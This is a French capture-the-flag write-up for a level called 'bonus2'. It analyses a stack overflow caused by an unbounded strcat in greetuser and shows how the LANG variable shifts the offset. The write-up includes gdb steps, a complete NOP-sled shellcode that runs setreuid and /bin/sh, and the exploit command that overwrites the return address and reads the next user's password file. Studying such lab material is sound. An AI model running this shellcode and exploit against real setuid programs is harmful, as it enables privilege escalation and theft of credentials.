# bonus2

## Objectif

Lire le fichier `.pass` de l'utilisateur suivant pour obtenir son mot de passe.

## 1. Vue d'ensemble

```
main(argc, argv)
  ├─ exige argc == 3                       ./bonus2 <arg1> <arg2>
  ├─ buffer[76] mis à zéro  (memset)
  ├─ strncpy(buffer,      argv[1], 40)     les 40 premiers octets
  ├─ strncpy(buffer + 40, argv[2], 32)     les 32 suivants
  ├─ getenv("LANG")  →  "fi" = 1, "nl" = 2, sinon 0   (global 0x8049988)
  ├─ recopie buffer au sommet de la pile   (pour le passer à greetuser)
  └─ greetuser(buffer)
       ├─ copie un "bonjour" selon la langue dans un buffer local (ebp-0x48)
       ├─ strcat(buffer_local, notre_saisie)      ← LA FAILLE
       └─ puts(buffer_local)
```

## 2. `main` — comment notre saisie entre

```asm
8048538:  cmpl   $0x3,0x8(%ebp)     ; argc == 3 ?  (sinon return 1)
8048548:  lea    0x50(%esp),%ebx    ; buffer = esp+0x50
804855a:  rep stos ...             ; met 76 octets (19 mots) à 0 = memset(buffer,0,76)
8048564:  movl   $0x28,0x8(%esp)    ; 3e arg = 0x28 = 40
8048577:  call   strncpy            ; strncpy(buffer,      argv[1], 40)
8048584:  movl   $0x20,0x8(%esp)    ; 3e arg = 0x20 = 32
8048594:  add    $0x28,%eax         ; destination = buffer + 40
804859a:  call   strncpy            ; strncpy(buffer + 40, argv[2], 32)
```

Notre entrée dans le buffer est donc : **`argv[1]` (40 octets) suivi de `argv[2]`
(32 octets)** = **72 octets contigus**. Le buffer ayant été mis à zéro sur 76
octets, les **4 derniers octets (72 à 75) restent à `0`** — on y reviendra, c'est
capital.

> ⚠️ **Impératif :** `strncpy(dest, src, n)` complète avec des `\0` si la source
> est plus courte que `n`. Si `argv[1]` fait moins de 40 octets, la zone est donc
> « coupée » par un `\0`, et le `strcat` de `greetuser` s'arrêtera avant
> d'atteindre `argv[2]`. **`argv[1]` doit donc faire exactement 40 octets.**

La détection de langue :

```asm
804859f:  movl   $0x8048738,(%esp)  ; "LANG"
80485a6:  call   getenv             ; getenv("LANG")
80485d6:  call   memcmp             ; memcmp(LANG, "fi", 2) == 0 ?  -> global = 1
8048605:  call   memcmp             ; memcmp(LANG, "nl", 2) == 0 ?  -> global = 2
```

`LANG=fi` → 1 (finnois), `LANG=nl` → 2 (néerlandais), sinon 0 (anglais). Le
résultat est rangé dans la **globale `0x8049988`**, que `greetuser` relira.

Enfin, les 76 octets du buffer sont recopiés au sommet de la pile (`rep movsl`)
pour être passés à `greetuser`, puis `call greetuser`.

## 3. `greetuser` — la faille

```asm
8048487:  sub    $0x58,%esp         ; frame de 88 octets
804848a:  mov    0x8049988,%eax     ; relit la langue
804848f:  cmp    $0x1,%eax          ; == 1 (fi) ?
8048497:  cmp    $0x2,%eax          ; == 2 (nl) ?
```

Selon la langue, un message d'accueil est copié dans un **buffer local à
`ebp-0x48`**. La longueur de ce message se **lit directement** dans le
désassemblage (nombre d'octets recopiés) :

| Langue | Adresse chaîne | Octets copiés | `strlen` (= **G**) |
|---|---|---|---|
| Anglais (0) | `0x8048710` → `"Hello "` | 7 (4+2+1) | **6** |
| Finnois (1) | `0x8048717` → `"Hyvää päivää "` | 19 (4+4+4+4+2+1) | **18** |
| Néerlandais (2) | `0x804872a` | 14 (4+4+4+2) | **13** |

*(Le finnois `"Hyvää päivää "` fait 18 octets et non 13 caractères : chaque `ä`
est codé sur **2 octets** en UTF-8.)*

Puis la concaténation fautive :

```asm
804850a:  lea    0x8(%ebp),%eax     ; notre saisie (recopiée en argument)
8048511:  lea    -0x48(%ebp),%eax   ; buffer local (contient déjà le "bonjour")
8048517:  call   strcat             ; strcat(buffer_local, notre_saisie)  <-- FAILLE
8048522:  call   puts
```

`strcat` ajoute notre saisie **à la suite** du bonjour, dans un buffer local trop
petit, **sans vérifier la taille** → la pile déborde jusqu'à l'adresse de retour.

## 4. Le calcul d'offset — et pourquoi `LANG=fi`

C'est le cœur du niveau. Le buffer local est à `ebp-0x48`, l'adresse de retour à
`ebp+4` :

```
distance buffer → adresse de retour = 0x48 + 4 = 76 octets
```

Mais `strcat` écrit **d'abord le bonjour** (longueur **G**), **puis** notre saisie.
Notre saisie commence donc à l'offset `G` dans le buffer, et l'adresse de retour
(offset 76) est atteinte par l'octet **`76 − G`** de notre saisie.

**Le piège, ce sont les 4 octets à zéro.** Rappel de la partie 2 : notre saisie
utile ne fait que **72 octets** contrôlables (`argv[1]` + `argv[2]`), suivis de **4
octets à `0`** qu'on ne maîtrise pas :

```
notre saisie :  [ argv[1] : 40 octets ][ argv[2] : 32 octets ][ 0 0 0 0 ]
offset saisie:  0 ........................ 39 40 .............. 71  72..75
                └──────────── 72 octets contrôlables ─────────┘ └ zéros ┘
```

Pour écraser l'adresse de retour avec **une vraie adresse**, il faut que ses **4
octets** `[76−G .. 79−G]` tombent **tous** dans les 72 octets contrôlables
(offset ≤ 71). Autrement dit : `79 − G ≤ 71`, soit **`G ≥ 8`**.

| Langue | G | Octets de saisie visant l'adresse de retour | Contrôlable ? |
|---|---|---|---|
| Anglais | 6 | 70, 71, **72, 73** | ❌ : 72–73 tombent dans les **zéros** → on ne contrôle que 2 des 4 octets (adresse `0x0000xxxx`, inutilisable) |
| Néerlandais | 13 | 63, 64, 65, 66 | ✅ (dans `argv[2]`) |
| Finnois | 18 | 58, 59, 60, 61 | ✅ (dans `argv[2]`) |

**Ce qui bloque, c'est donc l'anglais** (la langue par défaut) : le bonjour est
trop court (G=6), si bien que la saisie n'est pas « assez poussée » et 2 des 4
octets de l'adresse de retour tombent dans la zone de zéros non contrôlable. Il
faut un bonjour **plus long** (G ≥ 8) pour « tirer » l'adresse de retour vers
l'arrière, dans notre zone contrôlable.

Le finnois (18) **et** le néerlandais (13) remplissent tous les deux cette
condition. **On choisit le finnois parce que c'est le plus long** : l'adresse de
retour tombe le plus tôt possible dans `argv[2]` (offset 58 de la saisie, soit
`58 − 40 = ` **offset 18 de `argv[2]`**), ce qui laisse le plus de marge. *(Le
néerlandais marcherait aussi, à l'offset 23 de `argv[2]`.)*

→ **`LANG=fi`, et l'adresse de retour = `argv[2][18..21]`.**

## 5. Vérifier les chaînes et l'offset

**Les chaînes** (dans gdb, données statiques) :

```gdb
(gdb) x/s 0x8048738     # "LANG"
(gdb) x/s 0x804873d     # "fi"
(gdb) x/s 0x8048740     # "nl"
(gdb) x/s 0x8048717     # "Hyvää päivää "  (18 octets)
```

**L'offset**, hors gdb, avec un motif par blocs (chaque bloc de 4 = une lettre) :

```sh
export LANG=fi
gdb ./bonus2
(gdb) run `python -c 'print "A"*40'` `python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"'`
```

*(ou, si `dmesg` est interdit : `gdb ./bonus2 core` puis `info registers eip`.)*

On obtient **`EIP = 0x46464545`** → octets `45 45 46 46` → `"EEFF"` :

```
argv[2] :  A A A A B B B B C C C C D D D D E E E E F F F F ...
offset  :  0 1 2 3 4 5 6 7 8 9 ...        16 17 18 19 20 21
                                                 └───┴── EIP = E E F F
```

EIP a capturé les octets **18, 19, 20, 21** de `argv[2]` → l'adresse de retour
commence bien à l'**offset 18 de `argv[2]`**. ✅

## 6. Exploitation

Le buffer est trop petit et mal maîtrisé pour y loger le shellcode : comme à
bonus0, on le place dans une **variable d'environnement** précédée d'un toboggan
de NOP, et on fait pointer l'adresse de retour dessus. `bonus2` est setuid
`bonus3`, d'où le shellcode `setreuid` + `execve("/bin/sh")` (41 octets, celui du
level2).

**a. Shellcode dans l'environnement** (en gardant `LANG=fi`) :

```sh
export LANG=fi
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
```

**b. Adresse du shellcode** (helper `getenv`, on vise le milieu du sled donc + 0x64) :

```sh
/tmp/getenv SHELLCODE
```

**c. Lancer l'exploit :**

```sh
./bonus2 "$(python -c 'print "A"*40')" "$(python -c 'print "A"*18 + "\x<addr little-endian>"')"
```

- `argv[1]` = **40 `A`** pile (bourrage, sans `\0`) ;
- `argv[2]` = **18 `A`** + l'adresse du shellcode (4 octets) → tombe sur l'adresse
  de retour.

⚠️ L'adresse ne doit pas contenir d'octet `00` (un `\0` couperait `strcat` avant
la fin) : le toboggan de NOP laisse de la marge pour en choisir une valide.

```sh
whoami                          # bonus3
cat /home/user/bonus3/.pass
```

Le mot de passe récupéré est à reporter dans le fichier `flag`.

## Nature de la faille

Débordement de pile via `strcat` non borné dans `greetuser`. La longueur du
message d'accueil (contrôlée par `LANG`) décale la position de notre saisie : en
anglais (défaut) l'adresse de retour tombe dans 4 octets à zéro non maîtrisables,
donc on force un bonjour plus long (`LANG=fi`, 18 octets) pour que les 4 octets de
l'adresse de retour tombent dans `argv[2]`. On y écrit l'adresse d'un shellcode
logé dans une variable d'environnement.
